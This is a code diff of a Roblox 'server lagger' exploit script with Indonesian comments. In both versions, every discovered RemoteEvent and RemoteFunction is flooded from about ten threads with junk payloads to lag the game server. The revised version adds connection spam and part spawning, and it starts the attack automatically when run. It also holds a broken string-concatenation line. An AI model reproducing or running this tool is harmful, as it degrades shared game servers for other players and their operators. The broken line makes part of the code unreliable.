@@ -1,371 +1,144 @@
--- ROBLOX REMOTE LAG GENERATOR v1.0
--- Simple UI dengan remote spam yang work
-
 local Players = game:GetService("Players")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local localPlayer = Players.LocalPlayer
-
--- ==================== SIMPLE GUI ====================
-local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "LagGeneratorUI"
-ScreenGui.Parent = game:GetService("CoreGui") or localPlayer:WaitForChild("PlayerGui")
-
-local MainFrame = Instance.new("Frame")
-MainFrame.Name = "MainFrame"
-MainFrame.Parent = ScreenGui
-MainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-MainFrame.BorderColor3 = Color3.fromRGB(60, 60, 60)
-MainFrame.Position = UDim2.new(0.5, -150, 0.5, -100)
-MainFrame.Size = UDim2.new(0, 300, 0, 200)
-MainFrame.Active = true
-MainFrame.Draggable = true
-
-local Title = Instance.new("TextLabel")
-Title.Name = "Title"
-Title.Parent = MainFrame
-Title.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-Title.Size = UDim2.new(1, 0, 0, 30)
-Title.Font = Enum.Font.Code
-Title.Text = "⚡ LAG GENERATOR v1.0"
-Title.TextColor3 = Color3.fromRGB(255, 50, 50)
-Title.TextSize = 16
-
--- ==================== CONTROLS ====================
-local yOffset = 35
-
--- Status Label
-local StatusLabel = Instance.new("TextLabel")
-StatusLabel.Name = "StatusLabel"
-StatusLabel.Parent = MainFrame
-StatusLabel.Position = UDim2.new(0, 10, 0, yOffset)
-StatusLabel.Size = UDim2.new(1, -20, 0, 40)
-StatusLabel.BackgroundTransparency = 1
-StatusLabel.Text = "Status: READY\nFound: 0 remotes"
-StatusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
-StatusLabel.TextXAlignment = Enum.TextXAlignment.Left
-StatusLabel.TextYAlignment = Enum.TextYAlignment.Top
-StatusLabel.Font = Enum.Font.Code
-StatusLabel.TextSize = 12
-
-yOffset += 45
-
--- RPS Control
-local RPSLabel = Instance.new("TextLabel")
-RPSLabel.Name = "RPSLabel"
-RPSLabel.Parent = MainFrame
-RPSLabel.Position = UDim2.new(0, 10, 0, yOffset)
-RPSLabel.Size = UDim2.new(0.4, 0, 0, 20)
-RPSLabel.BackgroundTransparency = 1
-RPSLabel.Text = "RPS:"
-RPSLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
-RPSLabel.TextXAlignment = Enum.TextXAlignment.Left
-
-local RPSTextBox = Instance.new("TextBox")
-RPSTextBox.Name = "RPSTextBox"
-RPSTextBox.Parent = MainFrame
-RPSTextBox.Position = UDim2.new(0.45, 0, 0, yOffset)
-RPSTextBox.Size = UDim2.new(0.3, 0, 0, 20)
-RPSTextBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-RPSTextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-RPSTextBox.Text = "1000"
-RPSTextBox.Font = Enum.Font.Code
-
-local RPSSetButton = Instance.new("TextButton")
-RPSSetButton.Name = "RPSSetButton"
-RPSSetButton.Parent = MainFrame
-RPSSetButton.Position = UDim2.new(0.8, 0, 0, yOffset)
-RPSSetButton.Size = UDim2.new(0.15, 0, 0, 20)
-RPSSetButton.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
-RPSSetButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-RPSSetButton.Text = "SET"
-RPSSetButton.Font = Enum.Font.Code
-
-yOffset += 30
-
--- Attack Button
-local AttackButton = Instance.new("TextButton")
-AttackButton.Name = "AttackButton"
-AttackButton.Parent = MainFrame
-AttackButton.Position = UDim2.new(0.1, 0, 0, yOffset)
-AttackButton.Size = UDim2.new(0.35, 0, 0, 30)
-AttackButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
-AttackButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-AttackButton.Text = "START"
-AttackButton.Font = Enum.Font.Code
-
--- Stop Button
-local StopButton = Instance.new("TextButton")
-StopButton.Name = "StopButton"
-StopButton.Parent = MainFrame
-StopButton.Position = UDim2.new(0.55, 0, 0, yOffset)
-StopButton.Size = UDim2.new(0.35, 0, 0, 30)
-StopButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-StopButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-StopButton.Text = "STOP"
-StopButton.Font = Enum.Font.Code
-
-yOffset += 40
-
--- Stats Display
-local StatsLabel = Instance.new("TextLabel")
-StatsLabel.Name = "StatsLabel"
-StatsLabel.Parent = MainFrame
-StatsLabel.Position = UDim2.new(0, 10, 0, yOffset)
-StatsLabel.Size = UDim2.new(1, -20, 0, 60)
-StatsLabel.BackgroundTransparency = 1
-StatsLabel.Text = "Requests: 0\nRPS: 0\nActive: 0"
-StatsLabel.TextColor3 = Color3.fromRGB(150, 200, 150)
-StatsLabel.TextXAlignment = Enum.TextXAlignment.Left
-StatsLabel.TextYAlignment = Enum.TextYAlignment.Top
-StatsLabel.Font = Enum.Font.Code
-StatsLabel.TextSize = 12
-
--- Close Button
-local CloseButton = Instance.new("TextButton")
-CloseButton.Name = "CloseButton"
-CloseButton.Parent = MainFrame
-CloseButton.Position = UDim2.new(1, -25, 0, 5)
-CloseButton.Size = UDim2.new(0, 20, 0, 20)
-CloseButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
-CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-CloseButton.Text = "X"
-CloseButton.Font = Enum.Font.Code
-
--- ==================== CORE FUNCTIONS ====================
-local AttackActive = false
-local Remotes = {}
-local Threads = {}
-local Stats = {
-    TotalRequests = 0,
-    CurrentRPS = 0,
-    LastCount = 0,
-    LastTime = tick()
-}
-
--- Function untuk mencari semua remotes
-local function findAllRemotes()
-    local found = {events = {}, functions = {}}
-    
-    local function scanFolder(folder)
-        for _, obj in pairs(folder:GetChildren()) do
-            if obj:IsA("RemoteEvent") then
-                table.insert(found.events, obj)
-            elseif obj:IsA("RemoteFunction") then
-                table.insert(found.functions, obj)
-            end
-            
-            -- Scan recursively
-            scanFolder(obj)
+local RS = game:GetService("ReplicatedStorage")
+local lp = Players.LocalPlayer
+local sg = Instance.new("ScreenGui")
+sg.Parent = game.CoreGui
+local mf = Instance.new("Frame")
+mf.Parent = sg
+mf.Size = UDim2.new(0,250,0,150)
+mf.Position = UDim2.new(0.5,-125,0.5,-75)
+mf.BackgroundColor3 = Color3.new(0.1,0.1,0.1)
+mf.Active = true
+mf.Draggable = true
+local tl = Instance.new("TextLabel")
+tl.Parent = mf
+tl.Size = UDim2.new(1,0,0,30)
+tl.BackgroundColor3 = Color3.new(0.2,0,0)
+tl.Text = "SERVER LAGGER"
+tl.TextColor3 = Color3.new(1,0.5,0.5)
+tl.Font = Enum.Font.Code
+local st = Instance.new("TextLabel")
+st.Parent = mf
+st.Position = UDim2.new(0,10,0,35)
+st.Size = UDim2.new(1,-20,0,40)
+st.BackgroundTransparency = 1
+st.Text = "READY"
+st.TextColor3 = Color3.new(0.5,1,0.5)
+st.Font = Enum.Font.Code
+st.TextXAlignment = Enum.TextXAlignment.Left
+local sb = Instance.new("TextButton")
+sb.Parent = mf
+sb.Position = UDim2.new(0.1,0,0,80)
+sb.Size = UDim2.new(0.35,0,0,30)
+sb.BackgroundColor3 = Color3.new(0.8,0.1,0.1)
+sb.Text = "START"
+sb.TextColor3 = Color3.new(1,1,1)
+sb.Font = Enum.Font.Code
+local eb = Instance.new("TextButton")
+eb.Parent = mf
+eb.Position = UDim2.new(0.55,0,0,80)
+eb.Size = UDim2.new(0.35,0,0,30)
+eb.BackgroundColor3 = Color3.new(0.2,0.2,0.2)
+eb.Text = "STOP"
+eb.TextColor3 = Color3.new(1,1,1)
+eb.Font = Enum.Font.Code
+local cb = Instance.new("TextButton")
+cb.Parent = mf
+cb.Position = UDim2.new(1,-25,0,5)
+cb.Size = UDim2.new(0,20,0,20)
+cb.BackgroundColor3 = Color3.new(0.8,0.1,0.1)
+cb.Text = "X"
+cb.TextColor3 = Color3.new(1,1,1)
+cb.Font = Enum.Font.Code
+local active = false
+local threads = {}
+local remotes = {events={},functions={}}
+local function scan(f)
+    for _,o in pairs(f:GetChildren()) do
+        if o:IsA("RemoteEvent") then
+            table.insert(remotes.events,o)
+        elseif o:IsA("RemoteFunction") then
+            table.insert(remotes.functions,o)
         end
-    end
-    
-    -- Scan important places
-    local scanLocations = {
-        ReplicatedStorage,
-        workspace,
-        game:GetService("ServerScriptService"),
-        game:GetService("ServerStorage")
-    }
-    
-    for _, location in pairs(scanLocations) do
-        pcall(function()
-            scanFolder(location)
-        end)
-    end
-    
-    return found
-end
-
--- Function untuk generate payloads
-local function generatePayload()
-    local payloadType = math.random(1, 5)
-    
-    if payloadType == 1 then
-        return {string.rep("X", math.random(100, 500))}
-    elseif payloadType == 2 then
-        return {math.random(1, 1000000)}
-    elseif payloadType == 3 then
-        return {Vector3.new(math.random(), math.random(), math.random())}
-    elseif payloadType == 4 then
-        return {CFrame.new(math.random(), math.random(), math.random())}
-    else
-        local tbl = {}
-        for i = 1, math.random(5, 20) do
-            tbl[i] = math.random()
-        end
-        return {tbl}
+        scan(o)
     end
 end
-
--- Main attack function
-local function startAttack(targetRPS)
-    AttackActive = true
-    AttackButton.BackgroundColor3 = Color3.fromRGB(50, 200, 50)
-    AttackButton.Text = "RUNNING"
-    
-    -- Update status
-    StatusLabel.Text = string.format("Status: ATTACKING\nFound: %d events, %d functions", 
-        #Remotes.events, #Remotes.functions)
-    
-    -- Calculate requests per thread
-    local threads = math.min(10, #Remotes.events + #Remotes.functions)
-    local requestsPerThread = math.ceil(targetRPS / threads)
-    
-    -- Start attack threads
-    for i = 1, threads do
-        local thread = task.spawn(function()
-            local threadRequests = 0
-            
-            while AttackActive do
-                -- Attack RemoteEvents
-                for _, remote in pairs(Remotes.events) do
-                    if not AttackActive then break end
-                    
-                    pcall(function()
-                        remote:FireServer(unpack(generatePayload()))
-                        Stats.TotalRequests += 1
-                        threadRequests += 1
-                    end)
-                    
-                    -- Yield jika sudah banyak requests
-                    if threadRequests % 50 == 0 then
-                        task.wait()
-                    end
+scan(RS)
+scan(workspace)
+scan(game.ServerScriptService)
+scan(game.ServerStorage)
+st.Text = "REMOTES: "..#remotes.events+..#remotes.functions
+local function pl()
+    local t = math.random(1,4)
+    if t==1 then return {string.rep("X",math.random(200,800))} end
+    if t==2 then return {math.random(1,9999999)} end
+    if t==3 then return {Vector3.new(math.random(),math.random(),math.random())} end
+    local tb={}
+    for i=1,math.random(10,50) do tb[i]=math.random() end
+    return {tb}
+end
+local function start()
+    if active then return end
+    active=true
+    sb.BackgroundColor3=Color3.new(0.1,0.8,0.1)
+    sb.Text="RUNNING"
+    st.Text="ATTACKING"
+    local tc=10
+    for i=1,tc do
+        local th=task.spawn(function()
+            while active do
+                for _,r in pairs(remotes.events) do
+                    if not active then break end
+                    pcall(function() r:FireServer(unpack(pl())) end)
                 end
-                
-                -- Attack RemoteFunctions
-                for _, remote in pairs(Remotes.functions) do
-                    if not AttackActive then break end
-                    
-                    pcall(function()
-                        remote:InvokeServer(unpack(generatePayload()))
-                        Stats.TotalRequests += 1
-                        threadRequests += 1
-                    end)
-                    
-                    -- Yield jika sudah banyak requests
-                    if threadRequests % 50 == 0 then
-                        task.wait()
-                    end
+                for _,r in pairs(remotes.functions) do
+                    if not active then break end
+                    pcall(function() r:InvokeServer(unpack(pl())) end)
                 end
-                
-                -- Small delay untuk hindari crash
-                task.wait(0.001)
+                task.wait()
             end
         end)
-        
-        table.insert(Threads, thread)
+        table.insert(threads,th)
     end
-    
-    print("[LAG GEN] Attack started with " .. threads .. " threads")
-end
-
--- Stop attack function
-local function stopAttack()
-    AttackActive = false
-    
-    -- Stop all threads
-    for _, thread in pairs(Threads) do
-        pcall(task.cancel, thread)
-    end
-    
-    Threads = {}
-    
-    -- Update UI
-    AttackButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
-    AttackButton.Text = "START"
-    StatusLabel.Text = "Status: STOPPED"
-    
-    print("[LAG GEN] Attack stopped")
-end
-
--- Stats updater
-local function updateStats()
-    while true do
-        local now = tick()
-        local elapsed = now - Stats.LastTime
-        
-        if elapsed >= 1 then
-            Stats.CurrentRPS = (Stats.TotalRequests - Stats.LastCount) / elapsed
-            Stats.LastCount = Stats.TotalRequests
-            Stats.LastTime = now
-            
-            -- Update stats display
-            StatsLabel.Text = string.format(
-                "Requests: %d\nRPS: %d\nThreads: %d\nRemotes: %d",
-                Stats.TotalRequests,
-                math.floor(Stats.CurrentRPS),
-                #Threads,
-                #Remotes.events + #Remotes.functions
-            )
+    task.spawn(function()
+        while active do
+            for i=1,50 do
+                pcall(function()
+                    workspace.ChildAdded:Connect(function() end)
+                    game.Lighting.Changed:Connect(function() end)
+                end)
+            end
+            task.wait(0.1)
         end
-        
-        task.wait(0.1)
-    end
-end
-
--- ==================== EVENT HANDLERS ====================
--- Scan remotes on load
-task.wait(1)
-Remotes = findAllRemotes()
-StatusLabel.Text = string.format("Status: READY\nFound: %d events, %d functions", 
-    #Remotes.events, #Remotes.functions)
-
--- Attack button
-AttackButton.MouseButton1Click:Connect(function()
-    if AttackActive then
-        stopAttack()
-    else
-        local targetRPS = tonumber(RPSTextBox.Text) or 1000
-        if targetRPS > 10000 then
-            targetRPS = 10000
-            RPSTextBox.Text = "10000"
+    end)
+    task.spawn(function()
+        while active do
+            for i=1,20 do
+                pcall(function()
+                    local p=Instance.new("Part")
+                    p.Size=Vector3.new(10,10,10)
+                    p.Position=Vector3.new(math.random(-200,200),math.random(10,100),math.random(-200,200))
+                    p.Anchored=true
+                    p.CanCollide=false
+                    p.Parent=workspace
+                    game.Debris:AddItem(p,5)
+                end)
+            end
+            task.wait(0.05)
         end
-        startAttack(targetRPS)
-    end
-end)
-
--- Stop button
-StopButton.MouseButton1Click:Connect(stopAttack)
-
--- RPS set button
-RPSSetButton.MouseButton1Click:Connect(function()
-    local value = tonumber(RPSTextBox.Text)
-    if value then
-        if value > 10000 then
-            RPSTextBox.Text = "10000"
-        elseif value < 1 then
-            RPSTextBox.Text = "100"
-        end
-    end
-end)
-
--- Close button
-CloseButton.MouseButton1Click:Connect(function()
-    stopAttack()
-    ScreenGui:Destroy()
-end)
-
--- Auto-stop jika player leave
-game:GetService("Players").PlayerRemoving:Connect(function(player)
-    if player == localPlayer then
-        stopAttack()
-        pcall(function() ScreenGui:Destroy() end)
-    end
-end)
-
--- Start stats updater
-task.spawn(updateStats)
-
-print("[LAG GENERATOR] UI Loaded - Ready to use")
-print("[WARNING] This may cause lag and potential bans")
-
--- ==================== SIMPLE AUTO-START OPTION ====================
--- Hapus comment di bawah untuk auto-start ketika script dijalankan
---[[
-task.wait(3)
-if not AttackActive then
-    local targetRPS = 500  -- Default RPS
-    startAttack(targetRPS)
+    end)
 end
-]]
+local function stop()
+    active=false
+    for _,t in pairs(threads) do pcall(task.cancel,t) end
+    threads={}
+    sb.BackgroundColor3=Color3.new(0.8,0.1,0.1)
+    sb.Text="START"
+    st.Text="STOPPED"
+end
+sb.MouseButton1Click:Connect(start)
+eb.MouseButton1Click:Connect(stop)
+cb.MouseButton1Click:Connect(function() stop() sg:Destroy() end)
+game.Players.PlayerRemoving:Connect(function(p) if p==lp then stop() pcall(function() sg:Destroy() end) end end)
+task.wait(0.5)
+start()
